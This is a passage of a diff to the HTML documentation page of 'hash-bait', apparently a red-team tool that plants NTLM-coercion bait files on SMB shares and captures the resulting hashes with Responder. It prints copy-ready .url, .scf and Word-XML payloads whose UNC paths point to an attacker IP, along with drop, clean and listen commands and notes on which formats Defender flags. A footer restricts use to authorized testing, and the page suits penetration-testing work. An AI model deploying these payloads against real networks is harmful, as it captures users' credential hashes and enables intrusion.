+                <p class="hb-inspector-note"><strong>Coercion trigger:</strong> Windows Explorer resolves <code>IconFile</code> over SMB when rendering the folder, expanding <code>%USERNAME%</code> and sending the user's NetNTLMv2 handshake to <code>10.10.14.5</code>.</p>
+              </div>
+            </div>
+
+            <div role="tabpanel" id="panel-scf" aria-labelledby="tab-scf" hidden="until-found">
+              <div class="hb-panel-inner">
+                <div class="rfs-code-card">
+                  <div class="rfs-code-head">
+                    <div class="hb-code-head-left">
+                      <span class="rfs-badge b-warn"><span class="k">[scf]</span> @bait.scf</span>
+                      <span class="rfs-code-head-meta">85 BYTES · LF · SHELL COMMAND</span>
+                    </div>
+                    <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline hb-copy-btn" command="--copy" commandfor="payload-code-scf" aria-label="Copy @bait.scf payload contents">Copy</button>
+                  </div>
+                  <pre class="rfs-code-block"><code id="payload-code-scf"><span class="rfs-tok-kw">[Shell]</span>
+<span class="rfs-tok-fn">Command</span>=<span class="rfs-tok-num">2</span>
+<span class="rfs-tok-fn">IconFile</span>=<span class="rfs-tok-str">\\10.10.14.5\tools\nc.ico</span>
+<span class="rfs-tok-kw">[Taskbar]</span>
+<span class="rfs-tok-fn">Command</span>=<span class="rfs-tok-str">ToggleDesktop</span></code></pre>
+                </div>
+                <p class="hb-inspector-note"><strong>Coercion trigger:</strong> Older Windows Explorer builds resolve the Shell Command File <code>IconFile</code> UNC path on browse. Modern Windows 10/11 builds ignore <code>.scf</code> icon fetches; retained for legacy coverage and <code>lure</code> parity.</p>
+              </div>
+            </div>
+
+            <div role="tabpanel" id="panel-xml" aria-labelledby="tab-xml" hidden="until-found">
+              <div class="hb-panel-inner">
+                <div class="rfs-code-card">
+                  <div class="rfs-code-head">
+                    <div class="hb-code-head-left">
+                      <span class="rfs-badge b-steel"><span class="k">[xml]</span> @bait.xml</span>
+                      <span class="rfs-code-head-meta">164 BYTES · LF · WORD DOCUMENT XSL</span>
+                    </div>
+                    <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline hb-copy-btn" command="--copy" commandfor="payload-code-xml" aria-label="Copy @bait.xml payload contents">Copy</button>
+                  </div>
+                  <pre class="rfs-code-block"><code id="payload-code-xml"><span class="rfs-tok-kw">&lt;?xml</span> <span class="rfs-tok-fn">version</span>=<span class="rfs-tok-str">'1.0'</span> <span class="rfs-tok-fn">encoding</span>=<span class="rfs-tok-str">'UTF-8'</span> <span class="rfs-tok-fn">standalone</span>=<span class="rfs-tok-str">'yes'</span><span class="rfs-tok-kw">?&gt;</span>
+<span class="rfs-tok-kw">&lt;?mso-application</span> <span class="rfs-tok-fn">progid</span>=<span class="rfs-tok-str">'Word.Document'</span><span class="rfs-tok-kw">?&gt;</span>
+<span class="rfs-tok-kw">&lt;?xml-stylesheet</span> <span class="rfs-tok-fn">type</span>=<span class="rfs-tok-str">'text/xsl'</span> <span class="rfs-tok-fn">href</span>=<span class="rfs-tok-str">'\\10.10.14.5\lure.xsl'</span> <span class="rfs-tok-kw">?&gt;</span></code></pre>
+                </div>
+                <p class="hb-inspector-note"><strong>Coercion trigger:</strong> Declares <code>Word.Document</code> so opening the file in Microsoft Word fetches the remote XSL stylesheet over SMB from <code>\\10.10.14.5\lure.xsl</code>.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section: 4-Card Subcommand Grid -->
+  <section class="hb-section" id="commands" aria-labelledby="cmd-h">
+    <div class="hb-wrap">
+      <div class="hb-section-head">
+        <div>
+          <span class="hb-eyebrow">CLI SURFACE · 4 SUBCOMMANDS</span>
+          <h2 class="hb-h2" id="cmd-h">Subcommand Reference</h2>
+        </div>
+        <p class="hb-section-lead">Only <code>drop</code> and <code>clean</code> accept <code>--dry-run</code>. Every status line opens with a bracketed ASCII tag so piped and <code>NO_COLOR</code> output stays legible.</p>
+      </div>
+
+      <div class="hb-cmd-grid">
+        <article class="hb-cmd-card">
+          <div class="hb-cmd-head">
+            <h3 class="hb-cmd-name">drop</h3>
+            <div class="hb-cmd-badges">
+              <span class="rfs-badge b-beacon"><span class="k">[smb2/3]</span> upload</span>
+              <span class="rfs-badge b-ok"><span class="k">[flag]</span> --dry-run</span>
+            </div>
+          </div>
+          <div class="rfs-code-card hb-cmd-syntax">
+            <div class="rfs-code-head">
+              <span class="rfs-badge b-steel"><span class="k">[usage]</span> DROP</span>
+              <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline hb-copy-btn" command="--copy" commandfor="syn-drop" aria-label="Copy drop example command">Copy</button>
+            </div>
+            <pre class="rfs-code-block"><code id="syn-drop"><span class="rfs-tok-fn">hash-bait</span> <span class="rfs-tok-kw">drop</span> <span class="rfs-tok-kw">-t</span> <span class="rfs-tok-str">dc1</span> <span class="rfs-tok-kw">-s</span> <span class="rfs-tok-str">public</span> <span class="rfs-tok-kw">-c</span> <span class="rfs-tok-str">10.10.14.5</span> <span class="rfs-tok-kw">-i</span> <span class="rfs-tok-str">eth0</span> <span class="rfs-tok-kw">-u</span> <span class="rfs-tok-str">LAB/svc-reader</span></code></pre>
+          </div>
+          <p class="hb-cmd-desc">Renders and uploads bait directly over pure-Rust SMB2/3, then starts Responder unless <code>--no-listen</code> is set.</p>
+          <dl class="hb-flag-list">
+            <div><dt><code>-t, --target</code> / <code>-s, --share</code></dt><dd>Required SMB host and share; optional <code>-d, --dir PATH</code> for writable subdirectories.</dd></div>
+            <div><dt><code>-c, --callback IP</code></dt><dd>Required attacker IP embedded in UNC paths.</dd></div>
+            <div><dt><code>-i, --iface IFACE</code> / <code>--no-listen</code></dt><dd>One of the two is required unless <code>--dry-run</code> is set.</dd></div>
+            <div><dt><code>-p, --payload TYPE</code> / <code>--name BASE</code></dt><dd>Repeatable (<code>url</code>, <code>scf</code>, <code>xml</code>, <code>all</code>); default <code>all</code> and <code>@bait</code>.</dd></div>
+            <div><dt><code>--save-local</code> / <code>--dry-run</code></dt><dd>Write local copies alongside upload, or print plan with zero side effects.</dd></div>
+          </dl>
+        </article>
+
+        <article class="hb-cmd-card">
+          <div class="hb-cmd-head">
+            <h3 class="hb-cmd-name">clean</h3>
+            <div class="hb-cmd-badges">
+              <span class="rfs-badge b-fail"><span class="k">[smb2/3]</span> remove</span>
+              <span class="rfs-badge b-ok"><span class="k">[flag]</span> --dry-run</span>
+            </div>
+          </div>
+          <div class="rfs-code-card hb-cmd-syntax">
+            <div class="rfs-code-head">
+              <span class="rfs-badge b-steel"><span class="k">[usage]</span> CLEAN</span>
+              <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline hb-copy-btn" command="--copy" commandfor="syn-clean" aria-label="Copy clean example command">Copy</button>
+            </div>
+            <pre class="rfs-code-block"><code id="syn-clean"><span class="rfs-tok-fn">hash-bait</span> <span class="rfs-tok-kw">clean</span> <span class="rfs-tok-kw">-t</span> <span class="rfs-tok-str">dc1</span> <span class="rfs-tok-kw">-s</span> <span class="rfs-tok-str">public</span> <span class="rfs-tok-kw">-u</span> <span class="rfs-tok-str">LAB/svc-reader</span></code></pre>
+          </div>
+          <p class="hb-cmd-desc">Removes previously dropped bait matched by basename and payload types, warning on missing files without aborting.</p>
+          <dl class="hb-flag-list">
+            <div><dt><code>-t, --target</code> / <code>-s, --share</code> / <code>-d</code></dt><dd>Match the exact host, share, and subdirectory used during <code>drop</code>.</dd></div>
+            <div><dt><code>-p, --payload TYPE</code> / <code>--name BASE</code></dt><dd>Repeatable types (default <code>all</code>) and basename (default <code>@bait</code>).</dd></div>
+            <div><dt><code>--dry-run</code></dt><dd>Prints the exact files queued for deletion without connecting over SMB.</dd></div>
+            <div><dt><code>-u</code> / <code>--pass</code> / <code>--ask-pass</code></dt><dd>Same authentication surface as <code>drop</code>; exits <code>0</code> even when files are already gone.</dd></div>
+          </dl>
+        </article>
+
+        <article class="hb-cmd-card">
+          <div class="hb-cmd-head">
+            <h3 class="hb-cmd-name">list</h3>
+            <div class="hb-cmd-badges">
+              <span class="rfs-badge b-steel"><span class="k">[rpc]</span> srvsvc</span>
+              <span class="rfs-badge b-warn"><span class="k">[target]</span> Windows</span>
+            </div>
+          </div>
+          <div class="rfs-code-card hb-cmd-syntax">
+            <div class="rfs-code-head">
+              <span class="rfs-badge b-steel"><span class="k">[usage]</span> LIST</span>
+              <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline hb-copy-btn" command="--copy" commandfor="syn-list" aria-label="Copy list example command">Copy</button>
+            </div>
+            <pre class="rfs-code-block"><code id="syn-list"><span class="rfs-tok-fn">hash-bait</span> <span class="rfs-tok-kw">list</span> <span class="rfs-tok-kw">-t</span> <span class="rfs-tok-str">dc1</span> <span class="rfs-tok-kw">-u</span> <span class="rfs-tok-str">svc-reader</span> <span class="rfs-tok-kw">--ask-pass</span></code></pre>
+          </div>
+          <p class="hb-cmd-desc">Enumerates visible shares over <code>IPC$</code> + <code>srvsvc</code> (<code>NetShareEnumAll</code>), printing one share and remark per line.</p>
+          <dl class="hb-flag-list">
+            <div><dt><code>-t, --target HOST</code></dt><dd>Required SMB server IP or hostname (no <code>--dry-run</code> on <code>list</code>).</dd></div>
+            <div><dt><code>-u, --user USER</code></dt><dd>Accepts <code>user</code>, <code>DOMAIN/user</code>, <code>DOMAIN\user</code>, or <code>user@DOMAIN.LOCAL</code>.</dd></div>
+            <div><dt><code>--pass</code> / <code>--ask-pass</code></dt><dd>Resolution order: <code>--pass</code> &gt; <code>$HASH_BAIT_PASSWORD</code> &gt; <code>--ask-pass</code>.</dd></div>
+            <div><dt>NDR64 scope</dt><dd>Windows targets accept NDR64 binding; Samba rejects it loudly.</dd></div>
+          </dl>
+        </article>
+
+        <article class="hb-cmd-card">
+          <div class="hb-cmd-head">
+            <h3 class="hb-cmd-name">listen</h3>
+            <div class="hb-cmd-badges">
+              <span class="rfs-badge b-steel"><span class="k">[os]</span> Linux only</span>
+              <span class="rfs-badge b-warn"><span class="k">[exit]</span> 4 elsewhere</span>
+            </div>
+          </div>
+          <div class="rfs-code-card hb-cmd-syntax">
+            <div class="rfs-code-head">
+              <span class="rfs-badge b-steel"><span class="k">[usage]</span> LISTEN</span>
+              <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline hb-copy-btn" command="--copy" commandfor="syn-listen" aria-label="Copy listen example command">Copy</button>
+            </div>
+            <pre class="rfs-code-block"><code id="syn-listen"><span class="rfs-tok-fn">hash-bait</span> <span class="rfs-tok-kw">listen</span> <span class="rfs-tok-kw">-i</span> <span class="rfs-tok-str">eth0</span></code></pre>
+          </div>
+          <p class="hb-cmd-desc">Starts Responder directly without uploading bait, inheriting the terminal so you can split drop and capture across hosts.</p>
+          <dl class="hb-flag-list">
+            <div><dt><code>-i, --iface IFACE</code></dt><dd>Required capture network interface (no <code>--dry-run</code> on <code>listen</code>).</dd></div>
+            <div><dt>Command invoked</dt><dd>Runs <code>sudo responder -I &lt;iface&gt; -wv</code> when <code>responder</code> is on <code>$PATH</code>.</dd></div>
+            <div><dt>Platform behavior</dt><dd>Exits <code>4</code> when <code>responder</code> is missing or on Windows/macOS.</dd></div>
+            <div><dt>Split workflow</dt><dd>Use <code>drop --no-listen</code> from any workstation and <code>listen</code> on Kali.</dd></div>
+          </dl>
+        </article>
+      </div>
+
+      <div class="hb-global-strip" aria-label="Global options and exit codes">
+        <div class="hb-strip-item">
+          <span class="hb-strip-k">Global flags</span>
+          <span><code>--no-color</code> (or <code>$NO_COLOR</code>, <code>TERM=dumb</code>, pipe) · <code>-h, --help</code> · <code>-V, --version</code> (<code>hash-bait v1.0.1</code>)</span>
+        </div>
+        <div class="hb-strip-item">
+          <span class="hb-strip-k">Exit codes</span>
+          <span><code>0</code> ok · <code>1</code> SMB/runtime failure · <code>2</code> usage error or <code>-u</code> without password · <code>4</code> missing Responder / non-Unix</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section: Payload Format Comparison Matrix -->
+  <section class="hb-section" id="formats" aria-labelledby="formats-h">
+    <div class="hb-wrap">
+      <div class="hb-section-head">
+        <div>
+          <span class="hb-eyebrow">FORMAT MATRIX · GOLDEN PAYLOADS</span>
+          <h2 class="hb-h2" id="formats-h">Payload Format Comparison</h2>
+        </div>
+        <p class="hb-section-lead">All three templates are pinned byte-for-byte against <code>tests/golden/*</code> with LF endings. Select any subset with repeatable <code>-p</code> flags.</p>
+      </div>
+
+      <div tabindex="0" role="region" aria-labelledby="formats-cap" class="hb-table-wrap">
+        <table class="hb-matrix-table">
+          <caption id="formats-cap" class="rfs-sr-only">Comparison of .url, .scf, and .xml payload formats generated by hash-bait</caption>
+          <thead>
+            <tr>
+              <th scope="col">Format</th>
+              <th scope="col">Template &amp; Size</th>
+              <th scope="col">Trigger Mechanism</th>
+              <th scope="col">Target Windows Behavior</th>
+              <th scope="col">Defender &amp; SMB Notes</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <th scope="row">
+                <span class="rfs-badge b-beacon"><span class="k">[-p]</span> url</span>
+                <span class="hb-tbl-file">@bait.url</span>
+              </th>
+              <td>Internet Shortcut<br><span class="hb-tbl-mute">108 bytes · LF</span></td>
+              <td><code>IconFile=\\&lt;ip&gt;\%USERNAME%.icon</code> inside <code>[InternetShortcut]</code></td>
+              <td>Passive: Windows Explorer resolves the UNC icon path as soon as a user opens the share folder, expanding <code>%USERNAME%</code>.</td>
+              <td>Most reliable passive trigger across Windows 10/11; frequently flagged by Defender/EDR on shares and blocked when outbound TCP 445 or NTLM is restricted.</td>
+            </tr>
+            <tr>
+              <th scope="row">
+                <span class="rfs-badge b-warn"><span class="k">[-p]</span> scf</span>
+                <span class="hb-tbl-file">@bait.scf</span>
+              </th>
+              <td>Shell Command File<br><span class="hb-tbl-mute">85 bytes · LF</span></td>
+              <td><code>IconFile=\\&lt;ip&gt;\tools\nc.ico</code> inside <code>[Shell]</code></td>
+              <td>Passive on older hosts: legacy Explorer resolved <code>.scf</code> icons automatically; current Windows 10/11 builds ignore <code>.scf</code> icon fetches.</td>
+              <td>High-signal signature for AV and share monitors (especially paths like <code>tools\nc.ico</code>); omit with <code>-p url</code> when modern Windows targets are known.</td>
+            </tr>
+            <tr>
+              <th scope="row">
+                <span class="rfs-badge b-steel"><span class="k">[-p]</span> xml</span>
+                <span class="hb-tbl-file">@bait.xml</span>
+              </th>
+              <td>Word XML Document<br><span class="hb-tbl-mute">164 bytes · LF</span></td>
+              <td><code>&lt;?mso-application progid='Word.Document'?&gt;</code> + <code>&lt;?xml-stylesheet href='\\&lt;ip&gt;\lure.xsl' ?&gt;</code></td>
+              <td>Active open: browsing the share does not trigger coercion; opening the file in Microsoft Word requests the remote XSL stylesheet over SMB.</td>
+              <td>Lower passive noise than <code>.url</code>/<code>.scf</code> because Explorer ignores the stylesheet, though Protected View, Word policy, and egress TCP 445 rules still apply.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section: Tested On & Known Limitations (2-Column Architectural Grid) -->
+  <section class="hb-section" id="verification" aria-labelledby="verify-h">
+    <div class="hb-wrap">
+      <div class="hb-section-head">
+        <div>
+          <span class="hb-eyebrow">VERIFICATION &amp; BOUNDARIES</span>
+          <h2 class="hb-h2" id="verify-h">Tested On &amp; Known Limitations</h2>
+        </div>
+        <p class="hb-section-lead">Every CI check runs on every commit in the repository. Gaps stay documented plainly next to the passing platforms.</p>
+      </div>
+
+      <div class="hb-verify-grid">
+        <section class="hb-panel-col" aria-labelledby="tested-h">
+          <div class="hb-col-head">
+            <h3 class="hb-h3" id="tested-h">Tested On</h3>
+            <span class="rfs-badge b-ok"><span class="k">[ci]</span> 18 tests + live SMB</span>
+          </div>
+
+          <ul class="hb-arch-list">
+            <li>
+              <div class="hb-arch-row-head">
+                <span class="hb-arch-name">Windows 11 · stable Rust</span>
+                <span class="rfs-badge b-ok"><span class="k">[ok]</span> PASSED</span>
+              </div>
+              <p>Build host running 18 unit, golden payload, and CLI tests alongside <code>cargo fmt --check</code> and <code>clippy -D warnings</code>.</p>
+            </li>
+            <li>
+              <div class="hb-arch-row-head">
+                <span class="hb-arch-name"><code>windows-2022</code> · live Windows share</span>
+                <span class="rfs-badge b-ok"><span class="k">[ok]</span> PASSED</span>
+              </div>
+              <p>CI creates a local user and share, runs authenticated <code>drop</code>, <code>list</code>, and <code>clean</code> against <code>127.0.0.1</code>, and verifies the share ends empty.</p>
+            </li>
+            <li>
+              <div class="hb-arch-row-head">
+                <span class="hb-arch-name"><code>ubuntu-24.04</code> · live Samba share</span>
+                <span class="rfs-badge b-ok"><span class="k">[ok]</span> PASSED</span>
+              </div>
+              <p>CI stands up Samba with a real user and verifies authenticated <code>drop</code> and <code>clean</code>; <code>list</code> and guest drop run as informational probes.</p>
+            </li>
+            <li>
+              <div class="hb-arch-row-head">
+                <span class="hb-arch-name">macOS · <code>aarch64</code> &amp; <code>x86_64</code></span>
+                <span class="rfs-badge b-warn"><span class="k">[!]</span> NOT RUN</span>
+              </div>
+              <p>Cross-compiled and unsigned on every release with no runtime test coverage. First launch requires <code>xattr -d com.apple.quarantine</code>.</p>
+            </li>
+          </ul>
+        </section>
+
+        <section class="hb-panel-col is-limits" id="issues" aria-labelledby="issues-h">
+          <div class="hb-col-head">
+            <h3 class="hb-h3" id="issues-h">Known Limitations</h3>
+            <span class="rfs-badge b-fail"><span class="k">[!]</span> 5 boundaries</span>
+          </div>
+
+          <ul class="hb-arch-list">
+            <li>
+              <div class="hb-arch-row-head">
+                <span class="hb-arch-name"><code>listen</code> requires Linux + Responder</span>
+                <span class="rfs-badge b-warn"><span class="k">[exit]</span> 4</span>
+              </div>
+              <p>Responder needs Linux raw sockets. On Windows or macOS, <code>listen</code> explains and exits <code>4</code>; split with <code>drop --no-listen</code> locally and <code>listen</code> on Kali.</p>
+            </li>
+            <li>
+              <div class="hb-arch-row-head">
+                <span class="hb-arch-name"><code>list</code> is Windows-only (NDR64)</span>
+                <span class="rfs-badge b-fail"><span class="k">[rpc]</span> crate limit</span>
+              </div>
+              <p>The <code>smb</code> crate binds <code>srvsvc</code> offering only NDR64. Windows accepts it; Samba and NAS endpoints reject it while <code>drop</code> and <code>clean</code> work normally.</p>
+            </li>
+            <li>
+              <div class="hb-arch-row-head">
+                <span class="hb-arch-name">Guest sessions are best-effort</span>
+                <span class="rfs-badge b-warn"><span class="k">[smb]</span> SSPI check</span>
+              </div>
+              <p>Omitting <code>-u</code> sends <code>guest</code> with an empty password. Servers completing setup before SSPI finishes (Samba <code>map to guest</code>, many NAS boxes) error inside the crate; authenticated sessions are the tested path.</p>
+            </li>
+            <li>
+              <div class="hb-arch-row-head">
+                <span class="hb-arch-name"><code>--pass</code> appears in process listings</span>
+                <span class="rfs-badge b-warn"><span class="k">[auth]</span> ps visible</span>
+              </div>
+              <p>Prefer <code>$HASH_BAIT_PASSWORD</code> or <code>--ask-pass</code> (no-echo interactive prompt) over passing secrets on the command line.</p>
+            </li>
+            <li>
+              <div class="hb-arch-row-head">
+                <span class="hb-arch-name">Release binaries are unsigned</span>
+                <span class="rfs-badge b-steel"><span class="k">[sha256]</span> verify</span>
+              </div>
+              <p>Windows SmartScreen and macOS Gatekeeper warnings are expected; verify every release archive against <code>SHA256SUMS.txt</code>.</p>
+            </li>
+          </ul>
+        </section>
+      </div>
+    </div>
+  </section>
 </main>
 
-<footer class="wrap foot">
-    <p>MIT. For authorized security testing with explicit written permission only.</p>
-    <p><a href="https://github.com/Real-Fruit-Snacks/hash-bait">Source</a> · <a href="https://github.com/Real-Fruit-Snacks/hash-bait/blob/main/docs/USAGE.md">Usage</a> · <a href="https://github.com/Real-Fruit-Snacks/hash-bait/blob/main/CHANGELOG.md">Changelog</a> · <a href="https://github.com/Real-Fruit-Snacks/hash-bait/blob/main/SECURITY.md">Security</a> · <a href="https://real-fruit-snacks.github.io/">RFS</a></p>
+<footer class="hb-footer">
+  <div class="hb-wrap hb-footer-inner">
+    <p class="hb-footer-legal">MIT License. Built local-first for authorized security testing with explicit written permission only.</p>
+    <nav class="hb-footer-links" aria-label="Project links">
+      <a href="https://github.com/Real-Fruit-Snacks/hash-bait">Source</a>
+      <span aria-hidden="true">·</span>
+      <a href="https://github.com/Real-Fruit-Snacks/hash-bait/blob/main/docs/USAGE.md">Usage</a>
+      <span aria-hidden="true">·</span>
+      <a href="https://github.com/Real-Fruit-Snacks/hash-bait/blob/main/docs/ANALYSIS.md">Analysis</a>
+      <span aria-hidden="true">·</span>
+      <a href="https://github.com/Real-Fruit-Snacks/hash-bait/blob/main/CHANGELOG.md">Changelog</a>
+      <span aria-hidden="true">·</span>
+      <a href="https://github.com/Real-Fruit-Snacks/hash-bait/blob/main/SECURITY.md">Security</a>
+      <span aria-hidden="true">·</span>
+      <a href="https://real-fruit-snacks.github.io/">RFS</a>
+    </nav>
+  </div>
 </footer>
 </div>
 
-<div id="rfs-toast" class="rfs-toast is-ok" popover="manual" role="status" aria-live="polite"></div>
+<div id="rfs-toast" class="rfs-toast is-ok" popover="manual" role="region" aria-label="Notification">
+  <span class="hb-toast-msg" id="rfs-toast-msg"></span>
+  <button type="button" class="rfs-toast-close hb-toast-close" id="rfs-toast-close" popovertarget="rfs-toast" popovertargetaction="hide" aria-label="Dismiss notification">
+    <svg class="rfs-icon rfs-icon-sm" viewBox="0 0 24 24" aria-hidden="true"><path d="M6 6l12 12"/><path d="M18 6L6 18"/></svg>
+  </button>
+</div>
+<p class="rfs-sr-only">Screen reader announcements</p>
+<div id="rfs-live-status" class="rfs-sr-only" aria-live="polite" aria-atomic="true"></div>
+
 <script src="script.js"></script>
 </body>
 </html>
